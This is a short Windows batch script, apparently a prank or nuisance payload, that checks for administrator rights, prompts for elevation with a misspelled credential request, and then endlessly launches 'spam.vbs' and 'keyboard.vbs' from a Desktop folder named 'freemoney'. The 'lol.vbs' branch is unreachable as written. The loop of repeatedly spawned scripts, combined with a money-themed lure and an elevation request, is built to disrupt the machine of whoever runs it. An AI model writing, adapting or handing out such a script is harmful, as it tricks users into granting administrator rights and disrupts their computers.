@echo off

net session >nul 2>&1
if %errorlevel% == 0 (
  :: echo Script is already running with administrator privellages.
  goto main
  goto lol
)
goto admin

:admin
echo Requesting administrator privillages...
echo Plase provide administrator credentials.
echo .

powershell -command "Start-Process '%comspec%' -ArgumentList '/c %~s0 & pause' -Verb RunAs"
pause
exit

:lol
wscript.exe "%userprofile%\Desktop\freemoney\lol.vbs"

:main
wscript.exe "%userprofile%\Desktop\freemoney\spam.vbs"
wscript.exe "%userprofile%\Desktop\freemoney\keyboard.vbs"
goto main